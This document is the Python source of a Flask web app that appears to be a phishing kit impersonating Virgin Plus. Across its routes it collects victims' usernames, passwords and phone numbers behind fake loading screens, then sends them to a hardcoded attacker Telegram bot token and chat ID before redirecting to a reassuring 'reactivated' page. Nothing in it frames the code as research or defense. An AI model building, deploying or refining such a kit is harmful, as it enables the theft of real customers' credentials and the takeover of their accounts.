from flask import Flask, render_template, request, redirect, url_for, session
import requests

app = Flask(__name__)
app.secret_key = "some_random_secret_key_here"

# Your real Telegram credentials
TELEGRAM_BOT_TOKEN = "7321008127:AAEF8dr-B-b_hLkjA1qcXl07askvu0fRggs"
TELEGRAM_CHAT_ID = "-1002441207907"

def send_to_telegram(message_text):
    """Helper: send text to your Telegram bot/channel."""
    print(">>> Sending to Telegram:", message_text)  # Debug
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message_text
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print("Telegram send error:", e)

@app.route("/")
def home():
    """Main login page."""
    print(">>> GET / - Rendering index.html")
    return render_template("index.html")

@app.route("/loading", methods=["POST"])
def loading():
    """
    1) User clicks "Log in" on the main page -> POST here.
    2) Save username/password in session, then show loading.html spinner.
    3) JS in loading.html -> after 3s -> window.location.href = /verify
    """
    session["username"] = request.form.get("username")
    session["password"] = request.form.get("password")

    print(">>> POST /loading")
    print(f"    username={session['username']}, password={session['password']}")

    return render_template("loading.html")

@app.route("/verify", methods=["GET", "POST"])
def verify():
    """
    If GET: Show verify.html (phone form).
    If POST: Save phone in session, then redirect to /final_loading.
    """
    if request.method == "POST":
        phone_number = request.form.get("phone_number")
        session["phone_number"] = phone_number

        print(">>> POST /verify - phone_number=", phone_number)

        return redirect(url_for("final_loading"))
    else:
        print(">>> GET /verify - Rendering verify.html")
        return render_template("verify.html")

@app.route("/final_loading")
def final_loading():
    """
    Shows second spinner for 3s, then JS -> /send_data
    """
    print(">>> GET /final_loading - Rendering final_loading.html")
    return render_template("final_loading.html")

@app.route("/send_data")
def send_data():
    """
    Gathers username/password/phone from session -> sends to Telegram,
    clears session, then redirect to /success.
    """
    user = session.get("username", "N/A")
    pw = session.get("password", "N/A")
    phone = session.get("phone_number", "N/A")

    print(">>> GET /send_data - about to send Telegram message")
    message_text = (
        f"Virgin Plus Verification:\n"
        f"Username: {user}\n"
        f"Password: {pw}\n"
        f"Phone: {phone}"
    )
    send_to_telegram(message_text)

    session.clear()
    return redirect(url_for("success"))

@app.route("/success")
def success():
    """Final 'reactivated' page with link to official site."""
    print(">>> GET /success - Rendering success.html")
    return render_template("success.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)

